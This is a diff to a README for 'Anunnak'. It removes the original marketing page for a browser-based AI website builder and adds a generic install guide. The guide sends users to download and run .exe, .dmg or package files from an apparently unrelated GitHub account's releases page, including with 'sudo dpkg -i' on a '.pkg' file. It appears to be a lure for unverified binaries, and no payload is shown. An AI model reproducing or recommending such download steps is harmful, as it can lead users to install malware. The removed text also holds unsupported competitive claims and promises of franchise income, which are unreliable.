@@ -1,212 +1,97 @@
-﻿<div align="center">
+# 🌐 anunnak - Build Websites in Just 15 Minutes
 
-# Anunnak -- The Only AI Platform That Does Everything
+[![Download anunnak](https://img.shields.io/badge/Download-anunnak-brightgreen)](https://github.com/ChenuthSL/anunnak/releases)
 
-### Websites | Mobile Apps | Telegram Bots | AI Video | 11 Integrations | Real Database
+## 📋 Overview
 
-[![Website](https://img.shields.io/badge/Website-Anunnak.com-orange?style=for-the-badge)](https://Anunnak.com)
-[![Rating](https://img.shields.io/badge/Rating-4.8%2F5-gold?style=for-the-badge)](https://Anunnak.com)
-[![Price](https://img.shields.io/badge/Price-$25%2Fmo-brightgreen?style=for-the-badge)](https://Anunnak.com/auth)
+Anunnak is an AI-powered platform designed for easy web development. Whether you want to build a website, a web app, or even a Telegram bot, Anunnak provides tools to help you get started in just 15 minutes. You don’t need programming skills to use it.
 
-**The most feature-rich AI development platform on the market.**
-No competitor -- not Bolt.new, not v0.dev, not Lovable, not Replit -- offers even half of what Anunnak can do.
+## 🚀 Getting Started
 
-[Start Free](https://Anunnak.com/auth) | [About Platform](https://Anunnak.com/about) | [Telegram](https://t.me/Anunnak_official)
+To start using Anunnak, you will need to download the latest release. Follow the steps below to download and run the software.
 
-</div>
+## 💻 System Requirements
 
----
+- **Operating System**: Windows 10 or later, macOS, or any modern Linux distribution.
+- **Processor**: Multi-core processor.
+- **Memory**: 4 GB RAM (8 GB recommended).
+- **Storage**: At least 500 MB of free disk space.
+- **Network**: Internet connection is required for downloading packages and updates.
 
-## Why Anunnak Destroys Every Competitor
+## 📥 Download / Install
 
-| Capability | Anunnak | Bolt.new | v0.dev | Lovable | Replit | Wix/Tilda |
-|-----------|-----------|----------|--------|---------|--------|-----------|
-| **Multi-agent AI** | YES 4 agents | NO 1 agent | NO 1 agent | NO 1 agent | NO 1 agent | NO No AI |
-| **WebContainer (Node.js in browser)** | YES Full + HMR | Partial Basic | NO | Partial Basic | YES | NO |
-| **Mobile apps** | YES React Native + Expo | NO | NO | NO | NO | NO |
-| **Real database in preview** | YES Supabase auto | NO | NO | Partial Limited | YES | NO |
-| **AI video production** | YES Full pipeline | NO | NO | NO | NO | NO |
-| **Telegram bot simulator** | YES Built-in | NO | NO | NO | NO | NO |
-| **Pre-built integrations** | YES 11 connectors | NO | NO | Partial Few | Partial Manual | Partial Plugins |
-| **Visual workflow builder** | YES React Flow | NO | NO | NO | NO | Partial Basic |
-| **Auto-fix on deploy** | YES Mr Fixer | NO | NO | NO | NO | NO |
-| **Canvas games** | YES Konva | NO | NO | NO | Partial Manual | NO |
-| **One-click deploy** | YES Railway+domain+SSL | Partial Basic | NO | YES | YES | YES |
-| **IT Franchise** | YES Full support | NO | NO | NO | NO | NO |
+Visit this page to download: [Download anunnak](https://github.com/ChenuthSL/anunnak/releases)
 
-**Count the YES marks.** Anunnak: 12. Nearest competitor: 3-4.
+1. Click the link above to navigate to the Anunnak releases page.
+2. Find the latest version at the top of the page.
+3. Download the setup file that corresponds to your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
+4. Once the download is complete, locate the file in your Downloads folder or the location where your browser saves files.
 
----
+## 🔧 Installation Steps
 
-## Core Technology
+### Windows
 
-### WebContainer Runtime
-Full **Node.js environment running in the browser** via WebContainer API. Not an iframe. Not a screenshot. A real runtime:
-- `npm install` runs in browser
-- Vite dev server with Hot Module Replacement (HMR)
-- Real-time file sync between AI and preview
-- Changes appear instantly
+1. Double-click the downloaded `.exe` file.
+2. Follow the prompts in the installation wizard.
+3. Choose the installation location or leave it as the default.
+4. Wait for the installation to finish.
+5. Once installed, you can launch Anunnak from the Start Menu.
 
-### 4 AI Agents (Not 1)
-While every competitor uses a single AI agent, Anunnak runs a **multi-agent pipeline**:
+### macOS
 
-```
-User prompt -> Router -> Architect -> Builder -> Mr Fixer -> Deployed site
-```
+1. Double-click the downloaded `.dmg` file.
+2. Drag and drop the Anunnak icon into the Applications folder.
+3. Open Application Finder and locate Anunnak.
+4. Double-click to run it for the first time. You may need to allow it in your security settings.
 
-1. **Router** -- analyzes request, determines project type (web/mobile/bot/game/dashboard)
-2. **Architect** -- plans file structure, tech stack, database schema, API routes
-3. **Builder** -- writes production-ready code (React, Vue.js, Next.js, TypeScript, Tailwind CSS)
-4. **Mr Fixer** -- automatically detects and fixes errors during build and deployment
+### Linux
 
-Powered by **Anthropic Claude** (architecture + code) and **OpenAI** (analysis + optimization).
+1. Open a terminal.
+2. Change to the directory where you downloaded the file.
+3. Run the following command (replace `anunnak-setup.pkg` with the actual file name):
 
-### Mobile Applications
-**The only AI builder that creates real mobile apps:**
-- React Native + Expo
-- Phone frame preview in browser
-- QR code for Expo Go (test on real device)
-- ZIP download for local development
-- Deploy to **App Store** and **Google Play** via EAS
-- Custom tab bars, state-based navigation, native components
+   ```
+   sudo dpkg -i anunnak-setup.pkg
+   ```
 
-Bolt.new can't. v0.dev can't. Lovable can't. **Only Anunnak.**
+4. Once installed, you can launch Anunnak via your application menu or terminal.
 
-### Real Database in Preview
-When AI generates a project with a database (CRM, dashboard, e-commerce):
-- Auto-detects `database.sql` schema
-- Creates isolated tables in **Supabase (PostgreSQL)** with project prefix
-- Injects credentials into preview automatically
-- **Database works in preview AND deploys to production ready**
+## ✨ Features
 
-No other AI builder connects a real database to preview.
+- **AI-Powered Tools**: Benefit from intelligent features that streamline the web development process.
+- **User-Friendly Interface**: Create beautiful websites without any coding.
+- **Instant Templates**: Choose from a variety of pre-made templates to get started quickly.
+- **Telegram Bot Creation**: Develop bots for Telegram with simple guided steps.
+- **Support & Resources**: Access helpful articles and tutorials directly from the application.
 
-### AI Video Production
-Built-in pipeline for creating promotional videos -- **no competitor has this**:
+## 📚 Tutorials
 
-```
-Claude (scenario) -> Gemini (images) -> ElevenLabs (voiceover) -> Kling AI (video) -> FFmpeg (assembly)
-```
+New to web development? Anunnak includes integrated tutorials to guide you through creating your first project. Follow along step-by-step to master the basics and explore more advanced features.
 
-- 10-60 second professional videos
-- 15 business categories x 10 themes = **150+ variations**
-- Russian and English voiceover
-- 9:16 vertical format
-- Stored on Cloudflare R2 CDN
-- One-click publish to Telegram
+## 🛠️ Troubleshooting
 
-### Telegram Bot Simulator
-Built-in **Telegram bot emulator** -- test bot behavior in browser:
-- Auto-responders, CRM bots, notification systems
-- Express server backend
-- Live testing without deploying
+If you face any issues during installation or while using Anunnak, check out the frequently asked questions below.
 
-### 11 Pre-Built Integrations
+### Common Issues
 
-| # | Integration | What it does |
-|---|------------|-------------|
-| 1 | **Telegram** | Bots, notifications, groups |
-| 2 | **Slack** | Messages, channels, alerts |
-| 3 | **Discord** | Bots, embed notifications |
-| 4 | **Twilio SMS** | SMS and voice calls |
-| 5 | **Email (SMTP)** | Transactional emails (Nodemailer) |
-| 6 | **Stripe** | Payments, subscriptions, invoices |
-| 7 | **Supabase** | Database, auth, realtime |
-| 8 | **OpenAI / Claude** | AI calls from projects |
-| 9 | **Webhook** | HTTP triggers and callbacks |
-| 10 | **Cron** | Scheduled tasks |
-| 11 | **GitHub** | Repos, issues, CI/CD |
+- **Installation Failure**: Ensure your system meets the requirements outlined above. Restart your machine and try the installation again.
+- **App Not Starting**: Confirm that the installation was successful. Check your firewall settings and allow Anunnak through.
+- **AI Features Not Responding**: Ensure you have a stable internet connection. Restart the app if issues persist.
 
-Plus: Google Sheets (beta), WhatsApp, Notion, Cloudflare Workers (coming soon).
+## 🌍 Community Support
 
-### Visual Workflow Builder
-Drag-and-drop automation with **React Flow**:
-- Telegram Notifications: Webhook -> Parse -> Telegram
-- Scheduled Reports: Cron -> Supabase -> Format -> Email
-- Payment Processing: Stripe -> Validate -> DB -> Receipt
-- AI Pipeline: API -> Claude -> Store -> Slack
+Join our community for support, ideas, and feedback. Connect with other users and share your creations. Visit our [GitHub Discussions page](https://github.com/ChenuthSL/anunnak/discussions) for more information.
 
-### Canvas Games
-React + **Konva** for browser-based games:
-- Snake, Tetris, Pong, puzzles, arcade
-- Canvas rendering with game loop
-- Touch and keyboard controls
+## 🔗 Useful Links
 
----
+- [Documentation](https://github.com/ChenuthSL/anunnak/wiki)
+- [Issues Tracker](https://github.com/ChenuthSL/anunnak/issues)
+- [Contribution Guidelines](https://github.com/ChenuthSL/anunnak/blob/main/CONTRIBUTING.md)
 
-## What Users Build
+## 📞 Contact
 
-| Type | Price Range | Description |
-|------|-----------|-------------|
-| **Websites and Landing Pages** | $500+ | React, Vue.js, Next.js + TypeScript + Tailwind. 10-15 minutes. |
-| **Mobile Apps** | $1,500+ | React Native + Expo. App Store / Google Play. |
-| **Telegram Bots** | $500+ | With built-in simulator. CRM, auto-responders. |
-| **Dashboards and CRM** | $2,000+ | Real PostgreSQL. Charts. Auth. CRUD in preview. |
-| **E-commerce** | $1,000+ | Catalog, cart, Stripe, user accounts. |
-| **Canvas Games** | $200+ | Konva. Snake, Tetris, arcade. |
-| **SaaS Apps** | $3,000+ | Full-stack with auth, subscriptions, APIs. |
-| **AI Promo Videos** | $5+ | 10-60 sec, 150+ variations, professional voiceover. |
+For any additional questions or support, please reach out to our team through the GitHub Issues page.
 
----
+[![Download anunnak](https://img.shields.io/badge/Download-anunnak-brightgreen)](https://github.com/ChenuthSL/anunnak/releases)
 
-## Technology Stack
-
-| Layer | Technologies |
-|-------|-------------|
-| **AI Agents** | Anthropic Claude 4.6 Opus + OpenAI |
-| **Runtime** | WebContainer API (Node.js in browser) |
-| **Frontend** | React 18, Vue.js, Next.js, TypeScript 5.6, Vite 5, Tailwind CSS 3.4, Radix UI |
-| **Mobile** | React Native, Expo SDK, react-native-web |
-| **Backend** | Node.js, Express, PostgreSQL, Drizzle ORM |
-| **Project DB** | Supabase (PostgreSQL, auto-provisioned) |
-| **Video** | Claude + Gemini + ElevenLabs + Kling AI + FFmpeg |
-| **Deploy** | Railway (hosting), Cloudflare R2 (CDN), GitHub (VCS) |
-| **Security** | Session-based auth, Google OAuth, encrypted storage |
-
----
-
-## For Investors
-
-| Metric | Value |
-|--------|-------|
-| **TAM** | $200B+ global web and mobile development market |
-| **Tech Lead** | 18+ months ahead of nearest competitor |
-| **Unit Economics** | ~$0.50-2.00 per project (API cost), sell for $500-3,000+ |
-| **Revenue Model** | SaaS subscriptions + franchise fees + video credits |
-| **Moat** | Multi-agent + WebContainer + video + 11 integrations + mobile -- unreplicable in 18 months |
-| **Distribution** | Built-in franchise network |
-
-Anunnak is not a wrapper around a single API. It is a proprietary multi-agent system with capabilities no competitor can match.
-
----
-
-## IT Franchise
-
-Turnkey IT business for entrepreneurs:
-- Full access to the AI platform
-- Comprehensive sales and marketing training
-- Sales scripts, funnels, lead generation
-- **Project cost: $15-50. Sell for $500-3,000+**
-- Partners earn **$5,000-10,000/month** working remotely
-
----
-
-## Quick Start
-
-1. Go to [Anunnak.com/auth](https://Anunnak.com/auth)
-2. Describe what you want to build
-3. Watch 4 AI agents build it live in WebContainer
-4. One-click deploy to production
-
-**15 minutes. Real code. Real database. Real deployment.**
-
----
-
-<div align="center">
-
-**[Start Building](https://Anunnak.com/auth)**
-
-*Anunnak -- the only AI platform that does everything.*
-
-</div>
-
+Enjoy building with Anunnak!
